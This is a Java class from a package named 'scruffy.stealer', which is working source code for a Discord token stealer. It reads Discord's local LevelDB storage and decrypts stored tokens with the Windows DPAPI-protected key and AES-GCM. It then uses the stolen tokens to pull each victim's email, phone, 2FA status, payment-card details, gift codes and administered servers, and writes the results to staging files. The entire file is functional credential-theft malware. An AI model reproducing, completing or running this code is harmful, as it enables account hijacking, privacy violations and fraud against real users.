package scruffy.stealer.impl.app;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import org.apache.commons.io.FileUtils;

import com.github.kevinsawicki.http.HttpRequest;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;

import scruffy.stealer.utils.utilities;

public class discord extends utilities {

    public static List<String> owner_servers = new ArrayList<>(), gifts = new ArrayList<>();
    public static String token, username, discriminator, id, avatar, email, phone, locale, nitroType, cardemogies, date;
    public static int flag, premium_type;
    public static boolean check = true;

    public void initialize() {
        Arrays.stream(new File(System.getenv("appdata")).listFiles(File::isDirectory))
            .filter(x -> x.getName().startsWith("discord")).forEach(discordPath -> {
                try {
                    for (File file : new File(discordPath + "/Local Storage/leveldb").listFiles(File::isFile)) {
                        if (!file.getName().endsWith(".ldb")) 
                        	continue;

                        String parsed = FileUtils.readFileToString(file, StandardCharsets.UTF_8);
                        Matcher matcher = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)").matcher(parsed);

                        if (!matcher.find()) 
                        	continue;

                        byte[] key, tokens;
                        String reader = FileUtils.readFileToString(new File(discordPath + "/Local State"), StandardCharsets.UTF_8);
                        JsonObject json = new JsonParser().parse(reader).getAsJsonObject();
                        key = Base64.getDecoder().decode(json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString());
                        key = Arrays.copyOfRange(key, 5, key.length);
                        key = Crypt32Util.cryptUnprotectData(key);
                        tokens = Base64.getDecoder().decode(matcher.group().split("dQw4w9WgXcQ:")[1]);

                        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(tokens, 3, 15)));
                        token = new String(cipher.doFinal(Arrays.copyOfRange(tokens, 15, tokens.length)), StandardCharsets.UTF_8);

                        String valid = HttpRequest.get("https://canary.discord.com/api/v9/users/@me").userAgent("itzgonza1337.cu").authorization(token).body();
                        if (valid.contains("Unauthorized")) {
                            check = true;
                            continue;
                        }
                        check = false;
                        
                        JsonObject object = new JsonParser().parse(valid).getAsJsonObject();
                        
                        username = getStringFromJson(object, "username");
                        id = getStringFromJson(object, "id");
                        avatar = getStringFromJson(object, "avatar");
                        discriminator = getStringFromJson(object, "discriminator");
                        locale = getStringFromJson(object, "locale");
                        email = getStringFromJson(object, "email");
                        phone = getStringFromJson(object, "phone");
                        
                        premium_type = getIntFromJson(object, "premium_type");
                        flag = getIntFromJson(object, "public_flags");
                        
                        boolean mfa = getBooleanFromJson(object, "mfa_enabled");
                        boolean verified = getBooleanFromJson(object, "verified");
                        
                        nitroType = premium_type == 1 ? "nitro classic" : premium_type == 2 ? "nitro boost" : "no nitro";

                        String payment = HttpRequest.get("https://canary.discord.com/api/v9/users/@me/billing/payment-sources").userAgent("itzgonza1337.cu").authorization(token).body();
                        JsonArray array = new JsonParser().parse(payment).getAsJsonArray();
                        String brand = "none", last4 = "none", exp_month = "none", exp_year = "none", invalid = "none";
                        int paymentType = 0;

                        for (JsonElement element : array) {
                            JsonObject obj = element.getAsJsonObject();
                            exp_month = getStringFromJson(obj, "expires_month");
                            exp_year = getStringFromJson(obj, "expires_year");
                            invalid = getStringFromJson(obj, "invalid");
                            last4 = getStringFromJson(obj, "last_4");
                            brand = getStringFromJson(obj, "brand");
                            paymentType = getIntFromJson(obj, "type");
                        }

                        JsonObject data = new JsonObject();
                        JsonObject account = new JsonObject();
                        JsonObject privacy = new JsonObject();
                        JsonObject billing = new JsonObject();
                        JsonObject card = new JsonObject();
                        
                        account.addProperty("username", username);
                        account.addProperty("discriminator", discriminator);
                        account.addProperty("badges", getBadges(flag, false).isEmpty() ? "none" : getBadges(flag, false) + (premium_type != 0 ? ", nitro" : ""));
                        account.addProperty("subscription", nitroType);
                       
                        privacy.addProperty("email", email + (verified ? " (verified)" : ""));
                        privacy.addProperty("phone", phone);
                        privacy.addProperty("location", locale.toUpperCase());
                        privacy.addProperty("2fa", mfa);
                        
                        billing.add("payment_method", card);
                        
                        card.addProperty("type", brand);
                        card.addProperty("lastfour", last4);
                        card.addProperty("expires", (exp_month.length() != 2 ? "0" + exp_month : exp_month) + "/" + exp_year.substring(2));
                        card.addProperty("valid", !Boolean.parseBoolean(invalid));
                        
                        data.add("account", account);
                        data.add("privacy", privacy);
                        
                        if (!"none".equals(brand)) {
                            data.add("billings", billing);
                        }

                        String codes = HttpRequest.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes").userAgent("itzgonza1337.cu").authorization(token).body();
                        JsonArray codeArray = new JsonParser().parse(codes).getAsJsonArray();

                        if (codeArray != null) {
                            for (JsonElement element : codeArray) {
                                JsonObject obj = element.getAsJsonObject();
                                String giftname = getStringFromJson(obj.getAsJsonObject("promotion"), "outbound_title");
                                String giftcode = getStringFromJson(obj, "code");
                                gifts.add("🎁 **`" + giftname + "`**\n🎫 **`" + giftcode + "`**");
                            }
                        }

                        String hqGuilds = HttpRequest.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true").userAgent("itzgonza1337.cu").authorization(token).body();
                        JsonArray hqArr = new JsonParser().parse(hqGuilds).getAsJsonArray();

                        if (hqArr != null) {
                            for (JsonElement element : hqArr) {
                                JsonObject obj = element.getAsJsonObject();
                                boolean ownerCheck = getBooleanFromJson(obj, "owner");
                                boolean permCheck = Arrays.asList("35184372088831", "70368744177663", "4398046511103").contains(getStringFromJson(obj, "permissions"));
                                int online = getIntFromJson(obj, "approximate_presence_count");
                                int total = getIntFromJson(obj, "approximate_member_count");
                                String name = getStringFromJson(obj, "name");
                                String swId = getStringFromJson(obj, "id");
                                String own = ownerCheck ? "✅" : "❌";

                                if (permCheck || ownerCheck) {
                                    String invLink = HttpRequest.get("https://discord.com/api/v9/guilds/" + swId + "/invites").userAgent("itzgonza1337.cu").authorization(token).body();
                                    JsonArray inv = new JsonParser().parse(invLink).getAsJsonArray();
                                    String code = inv.size() > 0 ? getStringFromJson(inv.get(0).getAsJsonObject(), "code") : "scruffy";
                                    owner_servers.add("**" + name + " (" + swId + ")**" + "\n**`Owner: " + own + " | Members: 🟢 " + online + " / 🔴 " + total + "`**\n" + "[**Join Server**](https://discord.com/invite/" + code + ")\n");
                                }
                            }
                        }

                        cardemogies = paymentType == 1 ? "💳" : paymentType == 2 ? "<:paypal:973417655627288666>" : "**`none`**";

                        if (premium_type == 2) {
                            String months = HttpRequest.get("https://discord.com/api/v9/users/@me/billing/subscriptions").userAgent("itzgonza1337.cu").authorization(token).body();
                            JsonArray monthArr = new JsonParser().parse(months).getAsJsonArray();
                            for (JsonElement arr : monthArr) {
                                JsonObject obj = arr.getAsJsonObject();
                                date = getStringFromJson(obj, "created_at");
                            }
                        }

                        owner_servers = owner_servers.stream().distinct().collect(Collectors.toList());
                        gifts = gifts.stream().distinct().collect(Collectors.toList());

                        Arrays.asList(token, username, discriminator, id, avatar, email, phone, nitroType, cardemogies, date)
                        	.forEach(var -> {
                        		var = requireNonNullElse(var);
                        	});
                        		

                        FileUtils.writeStringToFile(new File(getFolder() + "/application/discord/" + token + ".json"), new GsonBuilder().setPrettyPrinting().create().toJson(data).replace("null", "none") + "\n", StandardCharsets.UTF_8, true);
                        content.add("discord");
                    }
                } catch (Exception ignored) {
                }
            }
        );
    }

    public static String requireNonNullElse(String value) {
        return value != null && !value.isEmpty() ? value : "**`none`**";
    }

    public static String getStringFromJson(JsonObject object, String key) {
        return object.has(key) && !object.get(key).isJsonNull() ? object.get(key).getAsString() : "none";
    }

    public static int getIntFromJson(JsonObject object, String key) {
        return object.has(key) && !object.get(key).isJsonNull() ? object.get(key).getAsInt() : 0;
    }

    public static boolean getBooleanFromJson(JsonObject object, String key) {
        return object.has(key) && !object.get(key).isJsonNull() && object.get(key).getAsBoolean();
    }
    
}